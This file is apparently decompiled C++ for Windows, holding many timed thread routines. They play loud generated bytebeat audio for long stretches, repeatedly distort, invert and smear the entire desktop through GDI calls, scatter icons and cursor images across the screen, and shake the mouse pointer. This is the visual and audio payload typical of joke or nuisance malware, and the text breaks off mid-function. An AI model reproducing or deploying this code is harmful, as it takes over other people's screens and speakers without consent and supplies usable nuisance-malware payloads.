#include <windows.h>
#include <cmath>
#include <time.h>
#pragma comment(lib, "Winmm.lib")


void __fastcall StartAddress(PVOID Parameter)
{
	__int64 v1; // rsi
	unsigned int v2; // ebx
	char* v3; // rdi
	double v4; // xmm0_8
	int v5; // eax
	HWAVEOUT hwo; // [rsp+30h] [rbp-D0h]
	struct wavehdr_tag v7; // [rsp+38h] [rbp-C8h]
	WAVEFORMATEX v8; // [rsp+68h] [rbp-98h]
	char v9; // [rsp+80h] [rbp-80h]
	char v10; // [rsp+81h] [rbp-7Fh]

	Sleep(0x1D4C0u);
	v1 = 13i64;
	do
	{
		hwo = 0i64;
		*(DWORD*)&v8.wFormatTag = 65537;
		v8.nSamplesPerSec = 32000;
		v8.nAvgBytesPerSec = 32000;
		*(DWORD*)&v8.nBlockAlign = 524289;
		v8.cbSize = 0;
		waveOutOpen(&hwo, 0xFFFFFFFF, &v8, 0i64, 0i64, 0);
		memset(&v10, 0, 0x58FD3ui64);
		v2 = 0;
		v3 = &v9;
		do
		{
			v4 = sin((double)(int)(v2 / (((v2 >> 8) & (v2 >> 13)) + 1)));
			v5 = v2++;
			*v3++ = (int)(v4 * (double)v5 * 64.0 + 128.0);
		} while (v2 < 0x58FD4);
		v7.lpData = &v9;
		*(__int64*)&v7.dwBufferLength = 364500i64;
		v7.dwUser = 0i64;
		*(__int64*)&v7.dwFlags = 0i64;
		v7.lpNext = 0i64;
		v7.reserved = 0i64;
		waveOutPrepareHeader(hwo, &v7, 0x30u);
		waveOutWrite(hwo, &v7, 0x30u);
		waveOutUnprepareHeader(hwo, &v7, 0x30u);
		Sleep(0xEA60u);
		--v1;
	} while (v1);
	RedrawWindow(0i64, 0i64, 0i64, 0x85u);
	ExitThread(1u);
}
void __fastcall sub_140003280(PVOID Parameter)
{
	__int64 v1; // rbx
	unsigned int v2; // ecx
	char* v3; // r8
	char v4; // al
	char v5; // dl
	HWAVEOUT hwo; // [rsp+30h] [rbp-D0h]
	struct wavehdr_tag v7; // [rsp+38h] [rbp-C8h]
	WAVEFORMATEX v8; // [rsp+68h] [rbp-98h]
	char v9; // [rsp+80h] [rbp-80h]
	char v10; // [rsp+81h] [rbp-7Fh]

	Sleep(0x1A5E0u);
	v1 = 13i64;
	do
	{
		hwo = 0i64;
		*(DWORD*)&v8.wFormatTag = 65537;
		v8.nSamplesPerSec = 2500;
		v8.nAvgBytesPerSec = 2500;
		*(DWORD*)&v8.nBlockAlign = 524289;
		v8.cbSize = 0;
		waveOutOpen(&hwo, 0xFFFFFFFF, &v8, 0i64, 0i64, 0);
		memset(&v10, 0, 0x56CABui64);
		v2 = 0;
		v3 = &v9;
		do
		{
			++v3;
			v4 = v2 & BYTE(v2);
			v5 = v2 * (v2 | (v2 >> 20)) / 0x2B;
			++v2;
			*(v3 - 1) = v4 * v5;
		} while (v2 < 0x56CAC);
		v7.lpData = &v9;
		*(__int64*)&v7.dwBufferLength = 355500i64;
		v7.dwUser = 0i64;
		*(__int64*)&v7.dwFlags = 0i64;
		v7.lpNext = 0i64;
		v7.reserved = 0i64;
		waveOutPrepareHeader(hwo, &v7, 0x30u);
		waveOutWrite(hwo, &v7, 0x30u);
		waveOutUnprepareHeader(hwo, &v7, 0x30u);
		Sleep(0xEA60u);
		--v1;
	} while (v1);
	RedrawWindow(0i64, 0i64, 0i64, 0x85u);
	ExitThread(1u);
}
void __fastcall sub_140001ED0(PVOID Parameter)
{
	__int64 v1; // rbx
	unsigned int v2; // eax
	char* v3; // r9
	char v4; // dl
	char v5; // cl
	HWAVEOUT hwo; // [rsp+30h] [rbp-D0h]
	struct wavehdr_tag v7; // [rsp+38h] [rbp-C8h]
	WAVEFORMATEX v8; // [rsp+68h] [rbp-98h]
	char v9; // [rsp+80h] [rbp-80h]
	char v10; // [rsp+81h] [rbp-7Fh]

	Sleep(0x9C40u);
	v1 = 3328i64;
	while (1)
	{
		hwo = 0i64;
		*(DWORD*)&v8.wFormatTag = 65537;
		v8.nSamplesPerSec = 3000;
		v8.nAvgBytesPerSec = 3000;
		*(DWORD*)&v8.nBlockAlign = 524289;
		v8.cbSize = 0;
		waveOutOpen(&hwo, 0xFFFFFFFF, &v8, 0i64, 0i64, 0);
		memset(&v10, 0, 0x32897ui64);
		v2 = 0;
		v3 = &v9;
		do
		{
			++v3;
			v4 = v2 * BYTE(v2) * ((v2 >> 1) + 1);
			v5 = v2++;
			*(v3 - 1) = v5 * v4;
		} while (v2 < 0x32898);
		v7.lpData = &v9;
		*(__int64*)&v7.dwBufferLength = 207000i64;
		v7.dwUser = 0i64;
		*(__int64*)&v7.dwFlags = 0i64;
		v7.lpNext = 0i64;
		v7.reserved = 0i64;
		waveOutPrepareHeader(hwo, &v7, 0x30u);
		waveOutWrite(hwo, &v7, 0x30u);
		waveOutUnprepareHeader(hwo, &v7, 0x30u);
		Sleep(0xEA60u);
		if (!--v1)
			ExitThread(1u);
	}
}
void __fastcall sub_140003100(PVOID Parameter)
{
	__int64 v1; // rbx
	unsigned int v2; // eax
	unsigned __int64 v3; // r8
	char v4; // dl
	char v5; // cl
	HWAVEOUT hwo; // [rsp+30h] [rbp-D0h]
	struct wavehdr_tag v7; // [rsp+38h] [rbp-C8h]
	WAVEFORMATEX v8; // [rsp+68h] [rbp-98h]
	char v9[237008]; // [rsp+80h] [rbp-80h]

	Sleep(0x17318u);
	v1 = 3328i64;
	const char* a12324354323121 = "1232435432312134";
	while (1)
	{
		hwo = 0i64;
		*(DWORD*)&v8.wFormatTag = 65537;
		v8.nSamplesPerSec = 5000;
		v8.nAvgBytesPerSec = 5000;
		*(DWORD*)&v8.nBlockAlign = 524289;
		v8.cbSize = 0;
		waveOutOpen(&hwo, 0xFFFFFFFF, &v8, 0i64, 0i64, 0);
		memset(v9, 0, 0x39DC8ui64);
		v2 = 0;
		v3 = 0i64;
		do
		{
			v4 = v2 * a12324354323121[(v3 >> 10) & 0xF];
			v5 = v2++;
			v9[v3++] = v5 * v4;
		} while (v2 < 0x39DC8);
		v7.lpData = v9;
		*(__int64*)&v7.dwBufferLength = 237000i64;
		v7.dwUser = 0i64;
		*(__int64*)&v7.dwFlags = 0i64;
		v7.lpNext = 0i64;
		v7.reserved = 0i64;
		waveOutPrepareHeader(hwo, &v7, 0x30u);
		waveOutWrite(hwo, &v7, 0x30u);
		waveOutUnprepareHeader(hwo, &v7, 0x30u);
		Sleep(0xEA60u);
		if (!--v1)
			ExitThread(1u);
	}
}
void __fastcall sub_140001820(PVOID Parameter)
{
	__int64 v1; // rsi
	unsigned int v2; // ecx
	char* v3; // r14
	char v4; // r9
	unsigned int v5; // er8
	HWAVEOUT hwo; // [rsp+30h] [rbp-D0h]
	struct wavehdr_tag v7; // [rsp+38h] [rbp-C8h]
	WAVEFORMATEX v8; // [rsp+68h] [rbp-98h]
	char v9; // [rsp+80h] [rbp-80h]
	char v10; // [rsp+81h] [rbp-7Fh]

	Sleep(0x88B8u);
	v1 = 3328i64;
	while (1)
	{
		hwo = 0i64;
		*(DWORD*)&v8.wFormatTag = 65537;
		v8.nSamplesPerSec = 8000;
		v8.nAvgBytesPerSec = 8000;
		*(DWORD*)&v8.nBlockAlign = 524289;
		v8.cbSize = 0;
		waveOutOpen(&hwo, 0xFFFFFFFF, &v8, 0i64, 0i64, 0);
		memset(&v10, 0, 0x36EE7ui64);
		v2 = 0;
		v3 = &v9;
		do
		{
			++v3;
			v4 = v2
				* (v2
					* (BYTE(v2) * ((v2 >> 1) & (v2 * ((v2 >> 9) & 0xED)) & 0x2D) * (v2 & 0x22 | (v2 >> 10) & 0x10)
						+ v2
						* (((v2 * (((v2 / 0xA) ^ (v2 / 0xA - 1280)) % 0xB)) >> 1) & 0x7F)
						* ((v2 >> 11) & ((v2 - 2296) >> 11))
						* ((v2 >> 5) | (v2 >> 6) | (v2 >> 1) & (4 * v2))
						* (v2 ^ (v2 >> 10) ^ ((v2 - 1280) >> 10) ^ (v2 + ((v2 >> 15) | 1))))
					- v2 / 0xFF);
			v5 = v2 * (((v2 / 0x280) ^ (v2 / 0x280 - 2)) % 0xD);
			++v2;
			*(v3 - 1) = ((v5 >> 1) & 0x7F) + v4;
		} while (v2 < 0x36EE8);
		v7.lpData = &v9;
		*(__int64*)&v7.dwBufferLength = 225000i64;
		v7.dwUser = 0i64;
		*(__int64*)&v7.dwFlags = 0i64;
		v7.lpNext = 0i64;
		v7.reserved = 0i64;
		waveOutPrepareHeader(hwo, &v7, 0x30u);
		waveOutWrite(hwo, &v7, 0x30u);
		waveOutUnprepareHeader(hwo, &v7, 0x30u);
		Sleep(0xEA60u);
		if (!--v1)
			ExitThread(1u);
	}
}
void __fastcall sub_140001650(PVOID Parameter)
{
	__int64 v1; // rbx
	unsigned int v2; // ecx
	char* v3; // r10
	unsigned int v4; // er9
	unsigned int v5; // kr00_4
	char v6; // al
	HWAVEOUT hwo; // [rsp+30h] [rbp-D0h]
	struct wavehdr_tag v8; // [rsp+38h] [rbp-C8h]
	WAVEFORMATEX v9; // [rsp+68h] [rbp-98h]
	char v10; // [rsp+80h] [rbp-80h]
	char v11; // [rsp+81h] [rbp-7Fh]

	v1 = 3328i64;
	while (1)
	{
		hwo = 0i64;
		*(DWORD*)&v9.wFormatTag = 65537;
		v9.nSamplesPerSec = 4000;
		v9.nAvgBytesPerSec = 6000;
		*(DWORD*)&v9.nBlockAlign = 524289;
		v9.cbSize = 0;
		waveOutOpen(&hwo, 0xFFFFFFFF, &v9, 0i64, 0i64, 0);
		memset(&v11, 0, 0x32897ui64);
		v2 = 0;
		v3 = &v10;
		do
		{
			++v3;
			v4 = v2 * (((v2 / 0x5A0) ^ ((v2 >> 6) - 2)) % 0xD) / 0xC;
			v5 = v2 * v2;
			v6 = v2++;
			*(v3 - 1) = (v6 * (v5 / 0xA) + (v4 & 1)) & 7;
		} while (v2 < 0x32898);
		v8.lpData = &v10;
		*(__int64*)&v8.dwBufferLength = 207000i64;
		v8.dwUser = 0i64;
		*(__int64*)&v8.dwFlags = 0i64;
		v8.lpNext = 0i64;
		v8.reserved = 0i64;
		waveOutPrepareHeader(hwo, &v8, 0x30u);
		waveOutWrite(hwo, &v8, 0x30u);
		waveOutUnprepareHeader(hwo, &v8, 0x30u);
		Sleep(0xEA60u);
		if (!--v1)
			ExitThread(1u);
	}
}
void __fastcall sub_140001050(PVOID Parameter)
{
	int i; // esi
	HWND v2; // rax
	HWND v3; // rax
	HDC v4; // rbp
	int v5; // edi
	int h; // ebx
	int v7; // eax
	HBRUSH v8; // rax
	int v9; // ebx
	int v10; // edi
	int v11; // er14
	int v12; // eax

	Sleep(0xBB8u);
	for (i = 0; i <= 30; ++i)
	{
		v2 = GetDesktopWindow();
		GetDC(v2);
		v3 = GetDesktopWindow();
		v4 = GetWindowDC(v3);
		v5 = GetSystemMetrics(0);
		h = GetSystemMetrics(1);
		v7 = rand();
		v8 = CreateSolidBrush((unsigned __int8)(v7 % 255));
		SelectObject(v4, v8);
		PatBlt(v4, 0, 0, v5, h, 0x5A0049u);
		rand();
		rand();
		v9 = rand() % 2;
		v10 = rand() % 2;
		v11 = rand() % -1;
		v12 = rand() % 2;
		BitBlt(v4, v12, v11, v10, v9, v4, 0, 0, 0x8800C6u);
		Sleep(0x64u);
	}
	ExitThread(1u);
}
void __fastcall sub_1400011B0(PVOID Parameter)
{
	int i; // esi
	HWND v2; // rax
	HWND v3; // rax
	HDC v4; // rbp
	int v5; // edi
	int h; // ebx
	int v7; // eax
	HBRUSH v8; // rax
	int v9; // ebx
	int v10; // edi
	int v11; // er14
	int v12; // eax

	Sleep(0x1B58u);
	for (i = 0; i <= 30; ++i)
	{
		v2 = GetDesktopWindow();
		GetDC(v2);
		v3 = GetDesktopWindow();
		v4 = GetWindowDC(v3);
		v5 = GetSystemMetrics(0);
		h = GetSystemMetrics(1);
		v7 = rand();
		v8 = CreateSolidBrush((unsigned __int8)(v7 % 255));
		SelectObject(v4, v8);
		PatBlt(v4, 0, 0, v5, h, 0x5A0049u);
		rand();
		rand();
		v9 = rand() % 5;
		v10 = rand() % 5;
		v11 = rand() % -1;
		v12 = rand() % 2;
		BitBlt(v4, v12, v11, v10, v9, v4, 0, 0, 0x8800C6u);
		Sleep(0x64u);
	}
	ExitThread(1u);
}
void __fastcall sub_140001310(PVOID Parameter)
{
	int i; // esi
	HWND v2; // rax
	HWND v3; // rax
	HDC v4; // rbp
	int v5; // edi
	int h; // ebx
	int v7; // eax
	HBRUSH v8; // rax
	int v9; // ebx
	int v10; // edi
	int v11; // er14
	int v12; // eax

	Sleep(0x2AF8u);
	for (i = 0; i <= 30; ++i)
	{
		v2 = GetDesktopWindow();
		GetDC(v2);
		v3 = GetDesktopWindow();
		v4 = GetWindowDC(v3);
		v5 = GetSystemMetrics(0);
		h = GetSystemMetrics(1);
		v7 = rand();
		v8 = CreateSolidBrush((unsigned __int8)(v7 % 255) << 16);
		SelectObject(v4, v8);
		PatBlt(v4, 0, 0, v5, h, 0x5A0049u);
		rand();
		rand();
		v9 = rand() % 5;
		v10 = rand() % 5;
		v11 = rand() % -1;
		v12 = rand() % 2;
		BitBlt(v4, v12, v11, v10, v9, v4, 0, 0, 0x8800C6u);
		Sleep(0x64u);
	}
	RedrawWindow(0i64, 0i64, 0i64, 0x85u);
	ExitThread(1u);
}
void __fastcall  sub_140001490(PVOID Parameter)
{
	int v1; // ebx
	HDC hdcSrc; // rsi
	int y1; // edi
	int v4; // er8

	Sleep(0x4A38u);
	v1 = 0;
	hdcSrc = GetDC(0i64);
	while (1)
	{
		y1 = rand() % 5;
		v4 = rand() % 5;
		if (v4)
		{
			if (v4 == 1)
			{
				++v1;
				BitBlt(hdcSrc, 0, y1, 5, 15, hdcSrc, 1, y1, 0xCC0020u);
			}
		}
		else
		{
			BitBlt(hdcSrc, 1, y1, 5, 15, hdcSrc, 0, y1, 0xCC0020u);
			++v1;
		}
		if (v1 > 100)
			ExitThread(1u);
	}
}
void __fastcall  sub_140001580(PVOID Parameter)
{
	int v1; // ebx
	HDC hdcSrc; // rsi
	int y1; // edi
	int v4; // er8

	Sleep(0x59D8u);
	v1 = 0;
	hdcSrc = GetDC(0i64);
	while (1)
	{
		y1 = rand() % 5;
		v4 = rand() % 7;
		if (!v4)
			break;
		if (v4 == 1)
		{
			BitBlt(hdcSrc, 0, y1, 5, 30, hdcSrc, 1, y1, 0xCC0020u);
			goto LABEL_6;
		}
	LABEL_7:
		if (v1 > 100)
			ExitThread(1u);
	}
	BitBlt(hdcSrc, 1, y1, 5, 30, hdcSrc, 0, y1, 0xCC0020u);
LABEL_6:
	++v1;
	goto LABEL_7;
}
void __fastcall  sub_140001AE0(PVOID Parameter)
{
	__int64 v1; // rbx
	unsigned int v2; // ecx
	char* v3; // r11
	unsigned int v4; // er10
	unsigned int v5; // er8
	char v6; // r9
	unsigned int v7; // er8
	HWAVEOUT hwo; // [rsp+30h] [rbp-D0h]
	struct wavehdr_tag v9; // [rsp+38h] [rbp-C8h]
	WAVEFORMATEX v10; // [rsp+68h] [rbp-98h]
	char v11; // [rsp+80h] [rbp-80h]
	char v12; // [rsp+81h] [rbp-7Fh]

	Sleep(0x1F40u);
	v1 = 3328i64;
	while (1)
	{
		hwo = 0i64;
		*(DWORD*)&v10.wFormatTag = 65537;
		v10.nSamplesPerSec = 8000;
		v10.nAvgBytesPerSec = 8000;
		*(DWORD*)&v10.nBlockAlign = 524289;
		v10.cbSize = 0;
		waveOutOpen(&hwo, 0xFFFFFFFF, &v10, 0i64, 0i64, 0);
		memset(&v12, 0, 0x32897ui64);
		v2 = 0;
		v3 = &v11;
		v4 = 0;
		do
		{
			++v3;
			v5 = v4 >> 1;
			v4 += 183;
			v6 = v2 * ((v2 * v2 / 0x15B) | (v2 >> 4) & v5 & 7);
			v7 = v2 * (((v2 / 0x1904) ^ (v2 / 0x280 - 2)) % 0xD);
			++v2;
			*(v3 - 1) = ((v7 >> 1) & 0x7F) + v6;
		} while (v4 < 0x24204A8);
		v9.lpData = &v11;
		*(__int64*)&v9.dwBufferLength = 207000i64;
		v9.dwUser = 0i64;
		*(__int64*)&v9.dwFlags = 0i64;
		v9.lpNext = 0i64;
		v9.reserved = 0i64;
		waveOutPrepareHeader(hwo, &v9, 0x30u);
		waveOutWrite(hwo, &v9, 0x30u);
		waveOutUnprepareHeader(hwo, &v9, 0x30u);
		Sleep(0xEA60u);
		if (!--v1)
			ExitThread(1u);
	}
}void __fastcall  sub_140001CB0(PVOID Parameter)
{
	HWND v1; // rbx
	HDC v2; // rdi
	int v3; // ebx
	__int64 v4; // rsi
	int v5; // eax
	struct tagRECT Rect; // [rsp+50h] [rbp-38h]
	POINT Point; // [rsp+60h] [rbp-28h]
	int v8; // [rsp+68h] [rbp-20h]
	int v9; // [rsp+6Ch] [rbp-1Ch]
	int v10; // [rsp+70h] [rbp-18h]
	int v11; // [rsp+74h] [rbp-14h]

	Sleep(0x6978u);
	v1 = GetDesktopWindow();
	GetWindowDC(v1);
	v2 = GetDC(0i64);
	GetWindowRect(v1, &Rect);
	v3 = 0;
	v4 = 11i64;
	while (1)
	{
		Point.x = Rect.left - v3;
		Point.y = Rect.top + v3;
		v8 = Rect.right - v3;
		v9 = Rect.top - v3;
		v10 = Rect.left + v3;
		v11 = Rect.bottom + v3;
		PlgBlt(v2, &Point, v2, Rect.left, Rect.top, Rect.right - Rect.left, Rect.bottom - Rect.top, 0i64, 0, 0);
		Sleep(0x1F4u);
		v5 = v3 + 1;
		if (v3 >= 35)
			v5 = v3;
		v3 = v5;
		if (!--v4)
			ExitThread(1u);
	}
}void __fastcall  sub_140001DC0(PVOID Parameter)
{
	HWND v1; // rbx
	HDC v2; // rdi
	int v3; // ebx
	__int64 v4; // rsi
	int v5; // eax
	struct tagRECT Rect; // [rsp+50h] [rbp-38h]
	POINT Point; // [rsp+60h] [rbp-28h]
	int v8; // [rsp+68h] [rbp-20h]
	int v9; // [rsp+6Ch] [rbp-1Ch]
	int v10; // [rsp+70h] [rbp-18h]
	int v11; // [rsp+74h] [rbp-14h]

	Sleep(0x88B8u);
	v1 = GetDesktopWindow();
	GetWindowDC(v1);
	v2 = GetDC(0i64);
	GetWindowRect(v1, &Rect);
	v3 = 0;
	v4 = 11i64;
	while (1)
	{
		Point.y = Rect.top - v3;
		v8 = Rect.right + v3;
		Point.x = Rect.left + v3;
		v9 = Rect.top + v3;
		v10 = Rect.left - v3;
		v11 = Rect.bottom - v3;
		PlgBlt(v2, &Point, v2, Rect.left, Rect.top, Rect.right - Rect.left, Rect.bottom - Rect.top, 0i64, 0, 0);
		Sleep(0x1F4u);
		v5 = v3 + 1;
		if (v3 >= 35)
			v5 = v3;
		v3 = v5;
		if (!--v4)
			ExitThread(1u);
	}
}void __fastcall  sub_140002060(PVOID Parameter)
{
	HWND v1; // rax
	int v2; // er13
	int v3; // er12
	int x1; // er15
	int y1; // er14
	int v6; // ebp
	int cy; // esi
	int v8; // eax
	int v9; // ebx
	int v10; // eax
	int v11; // edi
	int v12; // eax
	HBRUSH v13; // rax
	__int64 v14; // [rsp+98h] [rbp+10h]
	HDC hdc; // [rsp+A0h] [rbp+18h]

	Sleep(0xB3B0u);
	v1 = GetDesktopWindow();
	hdc = GetDC(v1);
	v14 = 171i64;
	do
	{
		rand();
		v2 = rand() % 1000;
		v3 = rand() % 1000;
		x1 = rand() % 1000;
		y1 = rand() % 1000;
		v6 = rand() % 1000;
		cy = rand() % 1000;
		v8 = rand();
		v9 = (unsigned __int8)(v8 + v8 / 255) << 8;
		v10 = rand();
		v11 = v9 | ((unsigned __int8)(v10 + v10 / 255) << 16);
		v12 = rand();
		v13 = CreateSolidBrush(v11 | (unsigned int)(unsigned __int8)(v12 % 255));
		SelectObject(hdc, v13);
		BitBlt(hdc, v2, v3, v6, cy, hdc, x1, y1, 0x98123Cu);
		Sleep(0x64u);
		--v14;
	} while (v14);
	ExitThread(1u);
}void __fastcall  sub_140002280(PVOID Parameter)
{
	HWND v1; // rax
	HDC v2; // rsi
	__int64 v3; // rbp
	int v4; // ebx
	int v5; // edi
	int v6; // ebx
	int v7; // ebx
	HICON v8; // rax
	HICON v9; // rax
	HICON v10; // rax
	HICON v11; // rax
	HICON v12; // rax
	HICON v13; // rax

	Sleep(0xBB80u);
	v1 = GetDesktopWindow();
	v2 = GetWindowDC(v1);
	GetSystemMetrics(0);
	rand();
	GetSystemMetrics(1);
	rand();
	v3 = 3001i64;
	do
	{
		v4 = GetSystemMetrics(0);
		v5 = rand() % v4;
		v6 = GetSystemMetrics(1);
		v7 = rand() % v6;
		v8 = LoadIconW(0i64, (LPCWSTR)0x7F00);
		DrawIcon(v2, v5, v7, v8);
		v9 = LoadIconW(0i64, (LPCWSTR)0x7F04);
		DrawIcon(v2, v5, v7, v9);
		v10 = LoadIconW(0i64, (LPCWSTR)0x7F01);
		DrawIcon(v2, v5, v7, v10);
		v11 = LoadIconW(0i64, (LPCWSTR)0x7F03);
		DrawIcon(v2, v5, v7, v11);
		v12 = LoadIconW(0i64, (LPCWSTR)0x7F01);
		DrawIcon(v2, v5, v7, v12);
		v13 = LoadIconW(0i64, (LPCWSTR)0x7F00);
		DrawIcon(v2, v5, v7, v13);
		--v3;
	} while (v3);
	ExitThread(1u);
}void __fastcall  sub_1400023D0(PVOID Parameter)
{
	HDC hdcSrc; // rbp
	int v2; // er15
	int cy; // er12
	__int64 v4; // r14
	int y1; // esi
	int x1; // edi
	int v7; // ebx
	int v8; // eax

	Sleep(0xDEA8u);
	hdcSrc = GetDC(0i64);
	v2 = GetSystemMetrics(0);
	cy = GetSystemMetrics(1);
	v4 = 81i64;
	do
	{
		y1 = rand() % 10;
		x1 = rand() % 10;
		v7 = rand() % 10;
		v8 = rand();
		BitBlt(hdcSrc, v8 % 10, v7, v2, cy, hdcSrc, x1, y1, 0x98123Cu);
		--v4;
	} while (v4);
	ExitThread(1u);
}void __fastcall  sub_1400024F0(PVOID Parameter)
{
	unsigned int v1; // eax
	LONG v2; // er14
	int v3; // er13
	int v4; // ebx
	int v5; // edi
	int v6; // eax
	HBRUSH v7; // rax
	int v8; // ebp
	int v9; // er15
	int v10; // er12
	int v11; // ebx
	int v12; // er13
	HRGN v13; // rsi
	HRGN v14; // rdi
	bool v15; // zf
	int v16; // [rsp+50h] [rbp-98h]
	int v17; // [rsp+54h] [rbp-94h]
	__int64 v18; // [rsp+58h] [rbp-90h]
	HDC hdc; // [rsp+60h] [rbp-88h]
	HDC ho; // [rsp+68h] [rbp-80h]
	HBITMAP v21; // [rsp+70h] [rbp-78h]
	void* ppvBits; // [rsp+78h] [rbp-70h]
	BITMAPINFO pbmi; // [rsp+80h] [rbp-68h]

	Sleep(0x105B8u);
	v1 = time(0);
	srand(v1);
	v16 = GetSystemMetrics(0);
	v2 = v16;
	v18 = 10i64;
	v3 = GetSystemMetrics(1);
	v17 = v3;
	while (1)
	{
		RedrawWindow(0i64, 0i64, 0i64, 0x85u);
		pbmi.bmiHeader.biSize = 40;
		pbmi.bmiHeader.biWidth = v2;
		pbmi.bmiHeader.biHeight = v3;
		*(DWORD*)&pbmi.bmiHeader.biPlanes = 2097153;
		*(WORD*)&pbmi.bmiColors[0].rgbGreen = 0;
		pbmi.bmiColors[0].rgbBlue = 0;
		hdc = GetDC(0i64);
		ho = CreateCompatibleDC(hdc);
		v21 = CreateDIBSection(hdc, &pbmi, 0, &ppvBits, 0i64, 0);
		SelectObject(ho, v21);
		BitBlt(ho, 0, 0, v2, v3, hdc, 0, 0, 0xCC0020u);
		v4 = (unsigned __int8)(rand() % 150) << 8;
		v5 = v4 | ((unsigned __int8)(rand() % 150) << 16);
		v6 = rand();
		v7 = CreateSolidBrush(v5 | (unsigned int)(unsigned __int8)(v6 % 150));
		SelectObject(hdc, v7);
		v8 = rand() % v2;
		v9 = rand() % v3;
		v10 = rand() % v2;
		v11 = 5;
		v12 = rand() % v3;
		do
		{
			Sleep(5u);
			v13 = CreateEllipticRgn(v8 - v8 / v11, v9 + v9 / v11, 0x7D0u / v11 + v8, v9 - 0x3B6u / v11);
			v14 = CreateRectRgn(v10 - v10 / v11, v12 / v11 + v12, 0x7D0u / v11 + v10, v12 - 0x3B6u / v11);
			InvertRgn(hdc, v13);
			InvertRgn(hdc, v14);
			++v11;
		} while (v11 < 16);
		DeleteObject(hdc);
		DeleteObject(ho);
		DeleteObject(v21);
		v15 = v18-- == 1;
		v2 = v16;
		v3 = v17;
		if (v15)
			ExitThread(1u);
	}
}void __fastcall  sub_140002800(PVOID Parameter)
{
	int v1; // er15
	HDC v2; // r12
	int v3; // er13
	int v4; // esi
	int v5; // eax
	int v6; // ebx
	int v7; // eax
	int v8; // edi
	int v9; // eax
	HBRUSH v10; // rax
	int v11; // ebx
	int v12; // eax
	int height; // er14
	int width; // ebp
	int bottom; // esi
	int v16; // edi
	int v17; // ebx
	int v18; // eax
	int v19; // ebx
	int v20; // eax
	int v21; // er13
	HDC v22; // r14
	HBITMAP v23; // rax
	int v24; // ebx
	int v25; // eax
	int v26; // edi
	int v27; // eax
	int v28; // esi
	int v29; // eax
	HBRUSH v30; // rax
	int y1; // ebp
	int v32; // esi
	int v33; // edi
	int v34; // eax
	int v35; // ebx
	unsigned int v36; // edx
	int v37; // [rsp+50h] [rbp-98h]
	LONG cy; // [rsp+54h] [rbp-94h]
	int v39; // [rsp+58h] [rbp-90h]
	HDC hdc; // [rsp+60h] [rbp-88h]
	void* ppvBits; // [rsp+68h] [rbp-80h]
	struct tagCURSORINFO pci; // [rsp+70h] [rbp-78h]
	BITMAPINFO pbmi; // [rsp+88h] [rbp-60h]

	Sleep(0x13498u);
	v1 = 0;
	v2 = GetDC(0i64);
	v39 = GetSystemMetrics(0);
	v3 = v39;
	v4 = GetSystemMetrics(1);
	v37 = v4;
	do
	{
		v5 = rand();
		v6 = (unsigned __int8)(v5 + v5 / 255) << 8;
		v7 = rand();
		v8 = v6 | ((unsigned __int8)(v7 + v7 / 255) << 16);
		v9 = rand();
		v10 = CreateSolidBrush(v8 | (unsigned int)(unsigned __int8)(v9 % 255));
		SelectObject(v2, v10);
		v11 = rand() % v4;
		v12 = rand();
		LineTo(v2, v12 % v3, v11);
		height = rand() % v4;
		width = rand() % v3;
		bottom = rand() % v4;
		v16 = rand() % v3;
		v17 = rand() % v37;
		v18 = rand();
		RoundRect(v2, v18 % v3, v17, v16, bottom, width, height);
		Sleep(0x64u);
		GetCursorInfo(&pci);
		pci.cbSize = 24;
		v19 = rand() % v37;
		v20 = rand();
		DrawIcon(v2, v20 % v3, v19, pci.hCursor);
		Sleep(0x64u);
		v21 = GetSystemMetrics(0);
		cy = GetSystemMetrics(1);
		RedrawWindow(0i64, 0i64, 0i64, 0x85u);
		pbmi.bmiHeader.biSize = 40;
		pbmi.bmiHeader.biWidth = v21;
		pbmi.bmiHeader.biHeight = cy;
		*(DWORD*)&pbmi.bmiHeader.biPlanes = 2097153;
		*(WORD*)&pbmi.bmiColors[0].rgbGreen = 0;
		pbmi.bmiColors[0].rgbBlue = 0;
		v22 = GetDC(0i64);
		hdc = CreateCompatibleDC(v22);
		v23 = CreateDIBSection(v22, &pbmi, 0, &ppvBits, 0i64, 0);
		SelectObject(hdc, v23);
		v24 = 1;
		do
		{
			v25 = rand();
			v26 = (unsigned __int8)(v25 + v25 / 255) << 8;
			v27 = rand();
			v28 = v26 | ((unsigned __int8)(v27 + v27 / 255) << 16);
			v29 = rand();
			v30 = CreateSolidBrush(v28 | (unsigned int)(unsigned __int8)(v29 % 255));
			SelectObject(v2, v30);
			y1 = rand() % 10;
			v32 = rand() % 145;
			v33 = rand() % 145;
			v34 = rand();
			BitBlt(hdc, v34 % 145, v33, v21, cy, v22, v32, y1, 0x98123Cu);
			v35 = v24 + 1;
			++v1;
			v36 = ((unsigned int)((unsigned __int64)(-1717986919i64 * v35) >> 32) >> 31)
				+ ((int)((unsigned __int64)(-1717986919i64 * v35) >> 32) >> 1);
			v24 = v35 + v36 + 4 * v36;
		} while (v24);
		v3 = v39;
		v4 = v37;
	} while (v1 <= 10);
	RedrawWindow(0i64, 0i64, 0i64, 0x85u);
	ExitThread(1u);
}void __fastcall  sub_140002C40(PVOID Parameter)
{
	HWND v1; // rax
	__int64 v2; // rsi
	DWORD v3; // edi
	int v4; // ebx
	struct tagPOINT Point; // [rsp+20h] [rbp-18h]

	Sleep(0x14C08u);
	v1 = GetDesktopWindow();
	GetWindowDC(v1);
	rand();
	rand();
	v2 = 101i64;
	do
	{
		v3 = rand() % 50 + 31;
		v4 = rand() % 2 + 2;
		GetCursorPos(&Point);
		SetCursorPos(Point.x, Point.y - v4);
		Sleep(v3);
		GetCursorPos(&Point);
		SetCursorPos(Point.x, v4 + Point.y);
		Sleep(v3);
		GetCursorPos(&Point);
		SetCursorPos(v4 + Point.x, Point.y);
		Sleep(v3);
		GetCursorPos(&Point);
		SetCursorPos(Point.x - v4, Point.y);
		Sleep(v3);
		--v2;
	} while (v2);
	RedrawWindow(0i64, 0i64, 0i64, 0x85u);
	ExitThread(1u);
}void __fastcall  sub_140002D80(PVOID Parameter)
{
	__int64 v1; // r14
	HDC hdcSrc; // rbp
	int y1; // ebx
	int x1; // edi
	int cy; // er15
	int v6; // er12
	int v7; // esi
	int v8; // eax

	Sleep(0x15F90u);
	v1 = 501i64;
	do
	{
		hdcSrc = GetDC(0i64);
		y1 = rand() % 4;
		x1 = rand() % 4;
		cy = rand() % 5;
		v6 = rand() % 5;
		v7 = rand() % 4;
		v8 = rand() % 4;
		BitBlt(hdcSrc, v8, v7, v6, cy, hdcSrc, x1, y1, 0xCC0020u);
		Sleep(1u);
		--v1;
	} while (v1);
	RedrawWindow(0i64, 0i64, 0i64, 0x85u);
	ExitThread(1u);
